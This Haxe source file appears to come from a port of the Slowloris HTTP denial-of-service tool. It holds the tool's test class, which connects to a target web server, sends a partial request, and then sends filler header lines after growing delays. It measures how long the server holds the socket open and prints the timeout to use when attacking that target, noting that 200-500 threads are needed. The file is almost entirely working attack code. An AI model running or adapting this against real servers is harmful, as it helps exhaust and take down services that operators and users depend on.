package slowloris;

#if neko
import neko.Lib;
import neko.Sys;
import neko.net.Host;
import neko.net.Socket;
import neko.vm.Thread;
#elseif cpp
import cpp.Lib;
import cpp.Sys;
import cpp.net.Host;
import cpp.net.Socket;
import cpp.vm.Thread;
#elseif php
import php.Lib;
import php.net.Socket;
import php.Sys;
import php.net.Host;
#end

/**
	Abstract test base.
*/
class TestBase {
	
	public static var minUsefulDelay = 166;
	public static var defaultDelays = [ 2, 30, 90, 240, 500 ];
	
	public var host(default,null) : String;
	public var port(default,null)  : Int;
	public var sendhost(default,null) : String;
	public var cache(default,null) : Bool;
	public var tcpTimeout(default,null) : Int;
	public var delays(default,null) : Array<Int>;
	
	public function new( host : String, ?port : Int = 80,
						 ?sendhost : String,
						 ?tcpTimeout : Int = 5,
						 ?cache : Bool = false,
						 ?delays : Array<Int> ) {
		this.host = host;
		this.port = port;
		this.sendhost = ( sendhost == null ) ? host: sendhost;
		this.tcpTimeout = tcpTimeout;
		this.cache = cache;
		this.delays = ( delays == null ) ? defaultDelays : delays;
	}
	
	public function start() {
		trace( "Testing: ["+host+":"+port+"]" );
		var totaltime = 0;
		for( d in delays ) totaltime += d;
		totaltime = Std.int( totaltime/60 );
		trace( "TCP timeout: "+tcpTimeout );
		trace( "Testing times: "+delays );
		trace( "This test could take up to "+totaltime+" minutes\n" );
	}
		
	function printSmallDelayInfo( delay : Int ) {
		trace( "Since the timeout ended up being so small ("+delay+" seconds) and it generally 
takes between 200-500 threads for most servers and assuming any latency at all...
you might have trouble using Slowloris against this target.
You can tweak the -timeout flag down to less than 10 seconds but it still may not build the sockets in time" );
	}
}

#if (neko||cpp||php)

class Test extends TestBase {
	
	public override function start() {
		super.start();
		var delay = 0;
		var s = new Socket();
		#if !php
		s.setTimeout( tcpTimeout );
		#end
		try s.connect( new Host( host ), port ) catch( e : Dynamic ) {
			trace( "Uhm... I can't connect to "+host+":"+port );
			trace( "Is something wrong?\nDying.\n" );
			return;
		}
		var payload = Slowloris.createPayload( sendhost, cache );
		try s.write( payload ) catch( e : Dynamic ) {
			trace( "That's odd - I connected but couldn't send the data to "+host+":"+port+"." );
			trace( "Is something wrong?\nDying." );
			return;
		}
		trace( "Connection successful, now comes the waiting game..." );
		for( t in delays ) {
			Lib.print( "\n  Trying a "+t+" second delay ... " );
			Sys.sleep( t );
			try s.write( "X-a: b\r\n" ) catch( e : Dynamic ) {
				Slowloris.warn( "\tFailed after "+t+" seconds." );
				break;
			}
			Lib.print( "Worked" );
			delay = t;
		}
		try s.write( "Connection: Close\r\n\r\n" ) catch( e : Dynamic ) { trace( e ); }
		if( delay < TestBase.minUsefulDelay )
			printSmallDelayInfo( delay ); 
		else {
			trace( "Okay that's enough time. Slowloris closed the socket." );
			trace( "Use "+delay+" seconds for -timeout." );
		}
	}
}

#end
